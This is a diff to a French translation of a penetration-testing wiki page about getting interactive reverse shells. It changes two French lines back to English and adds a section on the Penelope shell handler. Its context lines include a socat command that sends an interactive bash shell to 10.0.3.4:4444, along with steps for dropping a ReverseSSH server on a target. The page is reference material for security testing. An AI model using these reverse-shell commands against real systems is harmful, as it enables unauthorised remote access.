@@ -69,9 +69,9 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 Une méthode pratique pour **l'accès shell interactif**, ainsi que pour **les transferts de fichiers** et **le transfert de ports**, consiste à déposer le serveur ssh statiquement lié [ReverseSSH](https://github.com/Fahrj/reverse-ssh) sur la cible.
 
-Ci-dessous un exemple pour `x86` avec des binaires compressés avec upx. Pour d'autres binaires, consultez la [page des versions](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Below is an example for `x86` with upx-compressed binaries. For other binaries, check [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
-1. Préparez-vous localement pour attraper la demande de transfert de port ssh :
+1. Prepare locally to catch the ssh port forwarding request:
 
 {% code overflow="wrap" %}
 ```bash
@@ -112,6 +112,12 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
+## Penelope
+
+Penelope (https://github.com/brightio/penelope) met automatiquement à niveau les reverse shells Linux vers TTY, gère la taille du terminal, enregistre tout et bien plus encore. Il fournit également un support readline pour les shells Windows.
+
+![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+
 ## Pas de TTY
 
 Si pour une raison quelconque vous ne pouvez pas obtenir un TTY complet, vous **pouvez toujours interagir avec des programmes** qui attendent une entrée utilisateur. Dans l'exemple suivant, le mot de passe est passé à `sudo` pour lire un fichier :
